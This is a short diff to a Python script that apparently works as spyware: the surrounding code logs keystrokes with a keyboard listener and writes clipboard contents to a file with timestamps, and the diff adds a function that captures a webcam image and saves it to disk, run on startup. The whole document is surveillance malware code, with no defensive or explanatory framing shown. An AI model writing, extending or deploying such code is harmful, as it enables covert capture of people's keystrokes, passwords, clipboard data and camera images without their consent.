@@ -6,6 +6,7 @@ import platform
 import datetime 
 import win32clipboard 
 import pandas
+from cv2 import VideoCapture, imshow, imwrite, waitKey, destroyWindow
 
 keystrokes = [] #store strokes in list 
 
@@ -40,6 +41,17 @@ def clipboard_copy():
 		fil.write("\n")
 		fil.write("date and time:" + str(curr_date) + "\n")
 		fil.write("Clipboard Data:"+paste_data)
+
+def capture_camera():
+    cam = VideoCapture(0)
+    res, image = cam.read()
+    if res:
+        imshow("webcam", image)
+        imwrite("camera_capture.png", image)
+        waitKey(1)
+        destroyWindow("webcam")
+
+capture_camera()
 clipboard_copy()
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
